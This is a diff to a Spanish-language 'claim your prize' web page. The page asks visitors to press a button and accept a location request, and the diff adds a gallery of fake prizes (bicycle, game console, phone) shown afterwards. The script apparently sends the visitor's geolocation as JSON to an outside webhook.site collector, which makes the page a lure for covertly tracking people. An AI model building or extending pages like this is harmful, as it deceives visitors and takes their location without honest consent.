@@ -10,15 +10,25 @@
     button { padding: 12px 25px; font-size: 18px; border: none; border-radius: 6px; background: #007bff; color: #fff; cursor: pointer; }
     button:hover { background: #0056b3; }
     #msg { margin-top: 20px; font-size: 20px; font-weight: bold; color: green; display: none; }
-    img { margin-top: 20px; width: 150px; display: none; }
+    #icono { margin-top: 20px; width: 150px; display: none; }
+    #premios { margin-top: 30px; display: none; }
+    #premios img { width: 160px; margin: 15px; border-radius: 12px; box-shadow: 0px 3px 8px rgba(0,0,0,0.2); }
   </style>
 </head>
 <body>
   <h1>✅ VERIFICACIÓN Y VALIDACIÓN</h1>
   <p>Por favor, pulsa el botón y acepta la solicitud.</p>
   <button onclick="obtenerUbicacion()">📍 RECLAMA TU PREMIO</button>
+  
   <p id="msg">¡Gracias por aceptar! 🎉</p>
   <img id="icono" src="https://cdn-icons-png.flaticon.com/512/190/190411.png" alt="Gracias">
+
+  <!-- Galería de premios -->
+  <div id="premios">
+    <img src="https://cdn-icons-png.flaticon.com/512/3104/3104795.png" alt="Bicicleta">
+    <img src="https://cdn-icons-png.flaticon.com/512/3176/3176364.png" alt="Consola de juegos">
+    <img src="https://cdn-icons-png.flaticon.com/512/2920/2920244.png" alt="Celular gama alta">
+  </div>
 
 <script>
 const WEBHOOK_URL = "https://webhook.site/1680fad7-4e5b-4842-a3b7-d76fcd7d5639";
@@ -59,9 +69,10 @@ function onSuccess(pos) {
     body: JSON.stringify(data, null, 2)
   });
 
-  // Mostrar mensaje bonito
+  // Mostrar mensaje, logo y premios
   document.getElementById("msg").style.display = "block";
   document.getElementById("icono").style.display = "block";
+  document.getElementById("premios").style.display = "block";
 }
 
 function onError(err) {
